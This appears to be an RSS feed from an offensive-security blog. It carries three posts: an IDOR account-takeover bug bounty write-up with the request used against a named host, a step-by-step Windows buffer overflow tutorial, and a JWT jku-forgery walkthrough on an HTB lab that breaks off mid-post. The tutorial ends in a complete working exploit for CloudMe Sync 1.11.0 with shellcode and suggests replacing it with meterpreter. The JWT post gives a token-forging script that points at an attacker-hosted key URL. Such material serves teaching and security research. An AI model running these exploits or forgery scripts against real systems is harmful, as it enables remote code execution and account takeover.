@@ -1,0 +1,530 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>k0shane</title><description>Offensive Security Stuff</description><link>https://fuwari.vercel.app/</link><language>en</language><item><title>How I get 1500$ bounty with IDOR to Account Takeover</title><link>https://fuwari.vercel.app/posts/bug-bounty/how-i-get-1500-idor-ato/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/bug-bounty/how-i-get-1500-idor-ato/</guid><pubDate>Wed, 29 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Back in 2022, I didn&apos;t have a job yet at that time. So I was just doing full time bug bounty hunting and got a couple of bounties from hackerone and zerocopter. One day I saw a fresh program in &lt;code&gt;zerocopter&lt;/code&gt; by searching with google dorks, I think no one hunt it yet on this program except their internal pentest team.
+There are no other subdomains and only one domain is in scope. So I quickly grab the link and make an account.&lt;/p&gt;
+&lt;p&gt;After creating account, I go to my profile and it look like this.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/bbh/bbh1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;I noticed that we have our own &lt;code&gt;userID&lt;/code&gt;, it look like unique ID. And we can edit our profile such as &lt;code&gt;firstName&lt;/code&gt;, &lt;code&gt;lastName&lt;/code&gt; and &lt;code&gt;Email&lt;/code&gt;.
+So I intercept edit profile endpoint with burp and the request look like this.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PUT /api/users/86a2d2ba-0616-4468-8bb4-74a4ee620e9e HTTP/2
+Host: account.cloud-ara.tyk.io
+Cookie: ---[snip]---
+Content-Length: 68
+Sec-Ch-Ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;102&quot;, &quot;Google Chrome&quot;;v=&quot;102&quot;
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
+Sec-Ch-Ua-Platform: &quot;Windows&quot;
+Origin: https://account.cloud-ara.tyk.io
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://account.cloud-ara.tyk.io/account-admins/86a2d2ba-0616-4468-8bb4-74a4ee620e9e
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+{&quot;firstName&quot;:&quot;Member&quot;,&quot;lastName&quot;:&quot;Account&quot;,&quot;email&quot;:&quot;member@member.com&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;By looking this request, the first thing in my mind was &lt;code&gt;IDOR&lt;/code&gt;. So before thinking about possible or not as per their unique ID, I create another account and grab the &lt;code&gt;userID&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;And click on edit profile and intercept again with brup. Then I replaced with another &lt;code&gt;userID&lt;/code&gt; with the current &lt;code&gt;userID&lt;/code&gt;.The request will be like this.&lt;/p&gt;
+&lt;p&gt;Replace &lt;code&gt;userID&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PUT /api/users/86a2d2ba-0616-4468-8bb4-74a4ee620e9e # here
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Request Body:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{&quot;firstName&quot;:&quot;Hacked&quot;,&quot;lastName&quot;:&quot;Admin Account&quot;,&quot;email&quot;:&quot;hacked@admin.com&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Fortunately, it was changed the name and email of another user&apos;s account. To be honest, I really did not expect that cuz in their responsible disclosure page, they already mentioned that they have their own internal team to test their website. So this kind of bug should be aware.&lt;/p&gt;
+&lt;p&gt;Now the problem is how can we get that kind of unique ID? Then I found one endpoint that disclosing that &lt;code&gt;userID&lt;/code&gt; which in &lt;code&gt;Billing Admins&lt;/code&gt; tab.
+In this tab, we can invite another member. So after the user accepted our invite we can see like this.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/bbh/bbh2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;If we click on member account, we can see their profile including their &lt;code&gt;unquieID&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/bbh/bbh3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;So to get the &lt;code&gt;userID&lt;/code&gt;, the user must be in our team or otherwise we have to invite them. If we get their ID, we can change their email which will lead to account takeover. Then I quickly create the POC and report it. After one day, the issue has been verified and they reward me 4 digit bounty which I wasn&apos;t expect xD.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/bbh/bbh4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded></item><item><title>Win x86 Stack Based Buffer Overflow</title><link>https://fuwari.vercel.app/posts/win32-exp/stack-base-buffer-overflow/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/win32-exp/stack-base-buffer-overflow/</guid><pubDate>Wed, 29 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I won&apos;t talk about details in here like how the stack work or what are registers. You must have first knowledge in basic assembly language and debugger because I intended this blog for practical purpose, so I don&apos;t wanna make you bored for reading this kind of stuff. If you don&apos;t know yet how the stack work, there are plenty of good resources out there.I recommend to read it first. So Let&apos;s cut to the chase.&lt;/p&gt;
+&lt;h3&gt;What is buffer overflow?&lt;/h3&gt;
+&lt;p&gt;Buffer Overflow may happen when a program writes more data to a buffer (user inputs) beyond it can hold.
+This will lead to memory corruption which mean our buffer can overwrite some important datas of the program in memory. With this vulnerability, attacker can make the program do things it wasn&apos;t supported to do, like running malicious code. This kind of vulnerabilities may happen in programming languages like C and C++ due to their low-level memory management and lack protection. For other languages like Java has automatic memory management through the Garbage Collector. It takes care of allocating and freeing memory, reducing the risk of buffer overflows.&lt;/p&gt;
+&lt;p&gt;Think of a login form that ask us to input username and the developer set the username field with a maximum length 10 characters. But if we enter 50 or 100 characters, the extra data migth overwrite into the other parts of the program (EIP),and it will be break the program. So instead of breaking the program, we can control the &lt;code&gt;EIP&lt;/code&gt; (Instruction Pointer which hold the memory address of the next execution), we can redirect the execution of our program wherever we want. For example, redirect to our injected malicious shellcode location.&lt;/p&gt;
+&lt;h3&gt;Intro&lt;/h3&gt;
+&lt;p&gt;For the first of this series, we gonna use &lt;a href=&quot;https://www.exploit-db.com/apps/cba3235e4ac485d70544207acd415a67-CloudMe_1110.exe&quot;&gt;CloudMe Sync 1.11.0&lt;/a&gt; application to develop our exploit. This application is vulnerable to Remote Buffer Overflow on port 8888.&lt;/p&gt;
+&lt;p&gt;For the requirements, I used &lt;code&gt;windows 7&lt;/code&gt;, &lt;code&gt;Immunity Debugger&lt;/code&gt; and &lt;code&gt;python3&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;When we open the app, it will running on port 8888 in the background. We can check with &lt;code&gt;netstat -ano&lt;/code&gt; command.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/expdev/stack1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/expdev/stack1_1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Before we get started, we need to attach our app with immunity debugger, so we can see how the application is working in the background and all the instruction. Run cloudme application first, and in immunity debugger, click on &lt;code&gt;File &amp;gt; Attach&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/expdev/stack2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;Fuzzing&lt;/h3&gt;
+&lt;p&gt;Now for the first step, we need to identify how many buffer the application can handle, how many buffer we need to overwrite &lt;code&gt;EIP&lt;/code&gt; or crash the application.
+let&apos;s run our fuzzing script below.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+
+import socket
+from struct import pack
+
+IP = &quot;127.0.0.1&quot;
+port = 8888
+
+def fuzz():
+    try:
+        for i in range(0,10000,500):
+            buffer = b&quot;A&quot;*i
+            print(&quot;Fuzzing %s bytes&quot; % i)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((IP, port))
+            s.send(buffer)
+            s.close()
+    except:
+        print(&quot;Could not establish a connection&quot;)
+
+fuzz()
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;When we run the script, we can see that the application did not crash.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/expdev/stack3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;But it was overwritten in our &lt;code&gt;EIP&lt;/code&gt; with &lt;code&gt;41414141&lt;/code&gt; which is &lt;code&gt;A&lt;/code&gt; character in hex, we can check and see in debugger. Now we know the program is vulnerable to buffer overflow.&lt;/p&gt;
+&lt;p&gt;We need to know the exact location of the buffer to overwrite &lt;code&gt;EIP&lt;/code&gt; address. So we can put the address of our shellcode location into &lt;code&gt;EIP&lt;/code&gt; and redirect the program to execute it.&lt;/p&gt;
+&lt;h3&gt;Finding the Offset&lt;/h3&gt;
+&lt;p&gt;From above scenario, we used only &lt;code&gt;AAAA&lt;/code&gt; which is repetitive data to overflow the program. The problem is that it doesn&apos;t help us to locate the exact point of overflow, as we can&apos;t distinguish one &quot;A&quot; from another in the memory dump.&lt;/p&gt;
+&lt;p&gt;So to archive this, we will use &lt;code&gt;usr/bin/msf-pattern_create -l 5000&lt;/code&gt; tool to generate non-repeating string from &lt;code&gt;msf&lt;/code&gt;.Or we can easily use online generator tool in &lt;a href=&quot;https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/expdev/stack4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Update our tool with generated pattern.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python2
+
+import socket
+from struct import pack
+
+IP = &quot;127.0.0.1&quot;
+port = 8888
+
+def find_offset():
+    pattern = b&quot;Aa0Aa1Aa2---[snip]---u0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9&quot;
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((IP, port))
+    s.send(pattern)
+    s.close()
+
+find_offset()
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now restart debugger and run the script again.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/expdev/stack5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We can see that our &lt;code&gt;ESP&lt;/code&gt; is also overflow with our pattern. For now copy &lt;code&gt;EIP&lt;/code&gt; address and check with &lt;code&gt;patter_offset&lt;/code&gt; from msf.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/expdev/stack6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;Controlling EIP&lt;/h3&gt;
+&lt;p&gt;Now we know that we need &lt;code&gt;1052&lt;/code&gt; buffer to control &lt;code&gt;EIP&lt;/code&gt;. Let&apos;s update our code with this offset and put &lt;code&gt;BBBB&lt;/code&gt; as &lt;code&gt;EIP&lt;/code&gt; to make sure this will actually overwrite &lt;code&gt;EIP&lt;/code&gt; or not.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+
+import socket
+from struct import pack
+
+IP = &quot;127.0.0.1&quot;
+port = 8888
+
+def find_offset():
+    junk = b&quot;A&quot; * 1052
+    eip = b&quot;BBBB&quot;
+
+    payload = junk + eip
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((IP, port))
+    s.send(payload)
+    s.close()
+
+find_offset()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Run the script again.
+&lt;img src=&quot;/src/assets/expdev/stack7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;See! our &lt;code&gt;EIP&lt;/code&gt; was overwritten by &lt;code&gt;42424242&lt;/code&gt; which are &lt;code&gt;BBBB&lt;/code&gt; in hex.&lt;/p&gt;
+&lt;p&gt;Now we know we can control &lt;code&gt;EIP&lt;/code&gt; address which mean we can redirect the application&apos;s execution wherever we want (not wherever xD, will see).&lt;/p&gt;
+&lt;p&gt;For pointing &lt;code&gt;EIP&lt;/code&gt; to our shellcode&apos;s location, we have to use a method called &lt;code&gt;jump + reg&lt;/code&gt;. And our shellcode is overflowing on the stack, so we can use &lt;code&gt;jmp esp&lt;/code&gt; instruction.&lt;/p&gt;
+&lt;p&gt;So, the flow will be like this, we will use &lt;code&gt;jmp esp&lt;/code&gt; to jump on this stack which will be our shellcode location and execute it.&lt;/p&gt;
+&lt;p&gt;Before we finding that instruction, we need to find bad characters.&lt;/p&gt;
+&lt;h3&gt;Finding Bad Characters&lt;/h3&gt;
+&lt;p&gt;What are bad characters actually? When we exploiting buffer overflow, we need to inject a playload like shellcode into the memory of our target program. But certain characters contain in the shellcode may break our payload like &lt;code&gt;0x00&lt;/code&gt; (null byte) or &lt;code&gt;0x0A&lt;/code&gt; (new lines) which are use to terminate the strings.&lt;/p&gt;
+&lt;p&gt;When our payload include these characters, it may not working as intended and causing the exploit fail. So how can we find bad characters?&lt;/p&gt;
+&lt;p&gt;To identify bad characters, we need to send all the possible byte values &lt;code&gt;0x00 ot 0xFF&lt;/code&gt; (like above we sent junk code) by using debugger, then check for any characters that break our payload.&lt;/p&gt;
+&lt;p&gt;So, stop talking and let&apos;s see the demostration.&lt;/p&gt;
+&lt;p&gt;We can generate bad characters byte array using &lt;code&gt;!mona bytearray&lt;/code&gt; command. It will store two file in current working directory, &lt;code&gt;bytearray.txt&lt;/code&gt; and &lt;code&gt;bytearray.bin&lt;/code&gt; . You can set mona&apos;s current working directory with this command &lt;code&gt;!mona config -set workingfolder c:\mona&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/expdev/stack8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/expdev/stack9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Copy all the bytes and put it into our exploit.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+
+import socket
+from struct import pack
+
+IP = &quot;127.0.0.1&quot;
+port = 8888
+
+def find_offset():
+    bad_chars = bytes(&quot;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;
+&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f&quot;
+&quot;\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;
+&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;
+&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;
+&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;
+&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;
+&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;)
+
+    junk = b&quot;A&quot; * 1052
+    eip = b&quot;BBBB&quot;
+
+    payload = junk + eip + bad_chars
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((IP, port))
+    s.send(payload)
+    s.close()
+
+find_offset()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Run the script again.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/expdev/stack10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Now we can see our &lt;code&gt;ESP&lt;/code&gt; is overwritten by junk data, value is &lt;code&gt;0028D470&lt;/code&gt;. Right click on it and &lt;code&gt;Follow in Dump&lt;/code&gt; to see in the dump window. We can also check manually but in this case we gonna use &lt;code&gt;mona&lt;/code&gt; command which is &lt;code&gt;!mona compare -f &quot;C:\Program Files (x86)\Immunity Inc\Immunity Debugger\bytearray.bin&quot; -a 0028D470&lt;/code&gt; for automate task. If we have bad charaters, it will show all in the &lt;code&gt;BadChars&lt;/code&gt; field.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/expdev/stack11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;In this case, we don&apos;t actually have any bad characters. Great!&lt;/p&gt;
+&lt;h3&gt;Identify JMP Instruction&lt;/h3&gt;
+&lt;p&gt;Let&apos;s continue our exploit. Now we need to identity jump instruction in the modules &lt;code&gt;dll&lt;/code&gt; or similar component &lt;code&gt;cloueme.exe&lt;/code&gt; which are lack memory protection. We can use &lt;code&gt;!mona modules&lt;/code&gt; command to accomplish this.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/expdev/stack12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;You can see &lt;code&gt;Qt5Core.dll&lt;/code&gt; has &lt;code&gt;False&lt;/code&gt; on every protection. We will use this one. So to find our &lt;code&gt;jmp esp&lt;/code&gt; instruction inside that &lt;code&gt;dll&lt;/code&gt;, we have to use &lt;code&gt;opcode&lt;/code&gt;. To accomplish this, we can use mfs moudule called &lt;code&gt;nasm_shell.rb&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/expdev/stack13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Okay the &lt;code&gt;opcode&lt;/code&gt; for &lt;code&gt;jmp esp&lt;/code&gt; is &lt;code&gt;FF E4&lt;/code&gt;. Now let check this opcode is available or not inside our &lt;code&gt;Qt5Core.dll&lt;/code&gt; using this command &lt;code&gt;!mona find -s &quot;\xff\xe4&quot; -m Qt5Core.dll&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/expdev/stack14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Choose whatever address you want but you should avoid chosing the address that include null bytes &lt;code&gt;00&lt;/code&gt;, otherwise it may break our exploit. I will choose this address &lt;code&gt;0x68BAD568&lt;/code&gt; in this case.&lt;/p&gt;
+&lt;p&gt;Okay, now let see what we&apos;ve got here.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;We have &lt;code&gt;EIP&lt;/code&gt;&apos;s offset which is 1052.&lt;/li&gt;
+&lt;li&gt;We&apos;ve also identified bad characters, which was none in this case.&lt;/li&gt;
+&lt;li&gt;Then we&apos;ve found an application&apos;s &lt;code&gt;dll&lt;/code&gt; module which doesn&apos;t has any protection.&lt;/li&gt;
+&lt;li&gt;And we&apos;ve also got the &lt;code&gt;jmp esp&lt;/code&gt; instruction address inside that &lt;code&gt;dll&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;Exploiting&lt;/h3&gt;
+&lt;p&gt;Now it time to generate our shellcode with &lt;code&gt;msfvenom&lt;/code&gt;. I will use &lt;code&gt;calc.exe&lt;/code&gt; for this scenario.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/expdev/stack15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;So our full exploit will be like below.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+
+import socket
+from struct import pack
+
+IP = &quot;127.0.0.1&quot;
+port = 8888
+
+def exploit():
+
+    # msfvenom -p &apos;windows/exec&apos; CMD=&apos;calc.exe&apos; -f &apos;python&apos;
+    buf =  b&quot;&quot;
+    buf += b&quot;\xbe\xaf\x66\xd3\x6c\xdb\xc0\xd9\x74\x24\xf4\x5a&quot;
+    buf += b&quot;\x31\xc9\xb1\x31\x31\x72\x13\x03\x72\x13\x83\xea&quot;
+    buf += b&quot;\x53\x84\x26\x90\x43\xcb\xc9\x69\x93\xac\x40\x8c&quot;
+    buf += b&quot;\xa2\xec\x37\xc4\x94\xdc\x3c\x88\x18\x96\x11\x39&quot;
+    buf += b&quot;\xab\xda\xbd\x4e\x1c\x50\x98\x61\x9d\xc9\xd8\xe0&quot;
+    buf += b&quot;\x1d\x10\x0d\xc3\x1c\xdb\x40\x02\x59\x06\xa8\x56&quot;
+    buf += b&quot;\x32\x4c\x1f\x47\x37\x18\x9c\xec\x0b\x8c\xa4\x11&quot;
+    buf += b&quot;\xdb\xaf\x85\x87\x50\xf6\x05\x29\xb5\x82\x0f\x31&quot;
+    buf += b&quot;\xda\xaf\xc6\xca\x28\x5b\xd9\x1a\x61\xa4\x76\x63&quot;
+    buf += b&quot;\x4e\x57\x86\xa3\x68\x88\xfd\xdd\x8b\x35\x06\x1a&quot;
+    buf += b&quot;\xf6\xe1\x83\xb9\x50\x61\x33\x66\x61\xa6\xa2\xed&quot;
+    buf += b&quot;\x6d\x03\xa0\xaa\x71\x92\x65\xc1\x8d\x1f\x88\x06&quot;
+    buf += b&quot;\x04\x5b\xaf\x82\x4d\x3f\xce\x93\x2b\xee\xef\xc4&quot;
+    buf += b&quot;\x94\x4f\x4a\x8e\x38\x9b\xe7\xcd\x56\x5a\x75\x68&quot;
+    buf += b&quot;\x14\x5c\x85\x73\x08\x35\xb4\xf8\xc7\x42\x49\x2b&quot;
+    buf += b&quot;\xac\xbd\x03\x76\x84\x55\xca\xe2\x95\x3b\xed\xd8&quot;
+    buf += b&quot;\xd9\x45\x6e\xe9\xa1\xb1\x6e\x98\xa4\xfe\x28\x70&quot;
+    buf += b&quot;\xd4\x6f\xdd\x76\x4b\x8f\xf4\x14\x0a\x03\x94\xf4&quot;
+    buf += b&quot;\xa9\xa3\x3f\x09&quot;
+
+
+    junk = b&quot;A&quot; * 1052  # offset
+    eip = pack(&apos;&amp;lt;L&apos;,0x68BAD568) # jmp esp address
+    nop = b&quot;\x90&quot; * 32 # nop
+
+    payload = junk + eip + nop + buf
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((IP, port))
+    s.send(payload)
+    s.close()
+
+exploit()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;You may noticted, &lt;code&gt;NOP&lt;/code&gt; in this code.&lt;code&gt;NOP (No Operation)&lt;/code&gt; instruction tells the processor to do nothing. It&apos;s like a placeholder in code, where no action is required, but the program continues to run.&lt;/p&gt;
+&lt;p&gt;So why do we need this? If the program&apos;s execution jumps to any of the NOPs, it will &quot;slide&quot; down the sled until it hits the shellcode and executes it. This makes our exploit more likely to work, even if the return address isn’t perfectly accurate.&lt;/p&gt;
+&lt;p&gt;Without a NOP sled, you would have to pinpoint the exact starting address of the shellcode, which is hard and unreliable for our exploit.&lt;/p&gt;
+&lt;p&gt;If we run this, it will pop up calculator. That&apos;s it. You can test with your own meterpreter shellcode.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/expdev/stack16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded></item><item><title>Attacking Json Web Token</title><link>https://fuwari.vercel.app/posts/web-exploitation/attacking-json-web-token/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/web-exploitation/attacking-json-web-token/</guid><pubDate>Wed, 29 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Let&apos;s say, this is a normal user web page.
+&lt;img src=&quot;/src/assets/web/json1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;When we register and login with an account, the authentication mechanism is look like this.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/web/json2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;When we decode it,&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/web/json3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;It&apos;s using &lt;code&gt;RS256&lt;/code&gt; algorithm and token is using &lt;code&gt;jku&lt;/code&gt; header parameter which contains the JSON Web Key and the URL is to be used for token verification.&lt;/p&gt;
+&lt;p&gt;!!!info Info
+The jku header is a URI that refers to a resource for a set of JSON-encoded public keys, one of which corresponds to the key used to digitally sign the JWS.
+!!!&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;jku&lt;/code&gt; header url is look like this,&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/web/json4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;If an attacker generate a public and private key pairs and create a new token with a new private key (which we generated) and replace &lt;code&gt;jku&lt;/code&gt; header with the url which contains new generated &lt;code&gt;jwks.json&lt;/code&gt; file (host on a web server) and then the token would be accept by the server.&lt;/p&gt;
+&lt;p&gt;Download or copy that &lt;code&gt;jwks.json&lt;/code&gt; file.&lt;/p&gt;
+&lt;h4&gt;Creating a new keypair.pem&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;openssl genrsa -out keypair.pem 2048
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;Generating n,e,kid&lt;/h4&gt;
+&lt;p&gt;We&apos;re using python jwcrypto module to generate &lt;code&gt;n,e and kid&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Install &lt;code&gt;pip3 install jwcrypto&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/python3
+
+from jwcrypto import jwk,jwt 
+
+with open(&apos;keypair.pem&apos;,&apos;rb&apos;) as pemfile:
+	key = jwk.JWK.from_pem(pemfile.read())
+
+print(key)
+print(&quot;n: &quot;, key.n)
+print(&quot;e: &quot;, key.e)py
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Run &lt;code&gt;python3 jwk-gen-1.py&lt;/code&gt; and the output should look like this.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{&quot;kid&quot;:&quot;CrNfhdyvBdPsLMc_HlfoMXfHhCCsxVU7puGGIjKY7Eo&quot;,&quot;thumbprint&quot;:&quot;CrNfhdyvBdPsLMc_HlfoMXfHhCCsxVU7puGGIjKY7Eo&quot;}
+n:  _nnl4TPSAoA6JeumpR-ZgrIdu7K76Y1BEhAbIQ16Oe5Idp-DVz5qValRBGDH0XwYic5ukiNJYhKwFZv5S50fYo0zUgiBuHJzocQc1eD8duUTjvRIHJCc6DaXsRtJcq1paSfLds6FQQ0Q0hOY_aMF7gFOYeQ-i6mKGa8rA6nDU-267CsEUIcxJFV6a2Zw3597BMBNys_hwB75yst-XfmUGntyOloru1LH8NCPQvMBrmcLPmxeZpwF1Cisfy3Fcx0_gYCs4ZXyVbEHiGYoDEpZ_oO1rqqo3dtX877KWF11deuPFfNqblw9p1hIxgTtdStrUi0_JWUYP5PEct4KNdWIkw
+e:  AQAB
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Replace &lt;code&gt;kid&lt;/code&gt; , &lt;code&gt;n&lt;/code&gt; and &lt;code&gt;e&lt;/code&gt; in your &lt;code&gt;jwks.json&lt;/code&gt; file.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/src/assets/web/json5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Now we can create a new token as username &lt;code&gt;admin&lt;/code&gt;&lt;/p&gt;
+&lt;h4&gt;Creating new token&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/python3
+
+from jwcrypto import jwk,jwt 
+
+with open(&apos;keypair.pem&apos;,&apos;rb&apos;) as pemfile:
+	key = jwk.JWK.from_pem(pemfile.read())
+
+headers = {
+	&quot;alg&quot;: &quot;RS256&quot;,
+  	&quot;jku&quot;: &quot;http://hackmedia.htb/static/../redirect/?url=10.10.14.18:8000/jwks.json&quot;
+}
+
+Token = jwt.JWT(header=headers, claims={&quot;user&quot;:&quot;admin&quot;})
+Token.make_signed_token(key)
+print(Token.serialize())
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;!!!info Note
